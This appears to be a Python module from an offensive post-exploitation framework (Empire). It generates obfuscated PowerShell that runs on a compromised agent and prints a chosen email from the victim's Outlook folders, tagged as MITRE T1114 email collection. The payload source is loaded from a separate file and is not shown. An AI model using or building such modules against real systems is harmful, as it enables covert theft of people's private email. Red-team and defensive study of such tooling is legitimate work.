from __future__ import print_function

from builtins import object
from builtins import str

from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'View-Email',

            'Author': ['@xorrior'],

            'Description': ("Selects the specified folder and then outputs the email item at the specified index."),

            'Software': '',

            'Techniques': ['T1114'],

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/xorrior/EmailRaider',
                'http://www.xorrior.com/phishing-on-the-inside/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'FolderName' : {
                'Description'   :   'The Name of the Outlook Default Folder.',
                'Required'      :   True,
                'Value'         :   'Inbox'
            },
            'Index' : {
                'Description'   :   'Index of the Email item within the selected folder to display.',
                'Required'      :   True,
                'Value'         :   '0'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        moduleName = self.info["Name"]
        
        # read in the common powerview.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/MailRaider.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode + "\n"
        scriptEnd = moduleName + " "
        for option,values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value']) 

        scriptEnd += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'

        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        return script
